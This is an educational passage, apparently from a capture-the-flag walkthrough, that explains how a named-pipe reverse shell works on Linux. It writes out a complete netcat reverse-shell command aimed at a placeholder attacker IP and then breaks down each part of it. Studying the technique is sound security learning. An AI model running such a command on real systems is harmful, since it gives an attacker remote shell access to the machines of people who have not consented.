# Theory of reverse shells through a Named Pipe
> Original: https://medium.com/@hughbrown123/walk-through-hints-cat-pictures-1-thm-b915b3089827
Firstly, lets confirm what a Named Pipe in Linux is.

This is much like a Pipe (|) found on Linux, meaning it can be used to direct output from one command to being input for another command. This named pipe will be listened to and read from.

This named pipe does exists on the file system of the computer. Unless it is removed (rm) then it will remain there waiting for connections (input and output).

For a Named Pipe to function it needs two connections, something inputting data, and something reading the data. If you make only one of these connections, then that connection remains blocked and does nothing until the final connection is made.

Let us break down the command from step three;

cat /tmp/f | /bin/bash -i 2>&1 | nc <Attacking_IP> 9999 > /tmp/f

We are actually going to start in the middle of the command, which is nc <IP> 9999, as I think this is the easiest part to start at.

So, nc <Attacking_IP> 9999 connects out to the listener we have on our attacking machine. It makes a connection and waits for input (us typing commands). These commands are written (>) to the named pipe /tmp/f as seen at the end of the command.

cat /tmp/f — This will read any information that is being written to the /tmp/f named pipe (which was fed through nc originally). Keep in mind, this reading connection (cat) is blocked until an input connection is live.

| /bin/bash -i 2>&1 | — The commands read from /tmp/f above are piped into the interactive bash shell. The output is then sent to the nc <IP> 9999 to appear on our attacking machine. We then look at the info, type a command and the loop starts again.

As a note, the -i makes the shell interactive, meaning it can take in commands. These commands will come from cat /tmp/f

The 2>&1 means any standard errors (noted a 2) will be treated as standard output (1) and will get piped to the nc command. If we didn’t have this, the standard errors would never go to netcat, and we would never see them. This is the opposite to 2>/dev/null which is throwing all standard errors into the trash, so we don’t see them.